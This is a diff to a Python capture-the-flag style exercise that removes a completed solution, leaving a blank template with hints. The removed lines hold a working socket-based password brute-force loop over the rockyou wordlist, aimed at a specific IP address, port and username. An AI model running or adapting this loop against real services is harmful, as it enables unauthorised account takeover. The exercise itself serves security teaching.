@@ -26,16 +26,11 @@
 
 import socket
 
-host = "142.93.136.81" # IP address here
-port = 1337 # Port here
+host = "" # IP address here
+port = 0000 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
-
-def byte_to_string(b):
-    return b.decode("utf-8").rstrip().strip()
-
 def brute_force():
-    import sys
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -60,25 +55,9 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = "v0idcache"   # Hint: use OSINT
+    username = ""   # Hint: use OSINT
     password = ""   # Hint: use wordlist
 
-
-    with open(wordlist) as password_file:
-        for password in password_file:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-            s.recv(1024)
-            s.send((username+"\n").encode())
-            s.recv(1024)
-            s.send((password).encode())
-            recv = byte_to_string(s.recv(1024))
-            print("\rTrying password [ {} ] :: recived [ {} ]".format(password.rstrip(), recv), end="\r")
-            s.shutdown(socket.SHUT_RDWR)
-            s.close()
-            if recv != "Fail" and recv != "":
-                print("\n\nSUCCESS :: Password [ {} ]\n\n".format(password))
-                break
 
 
 
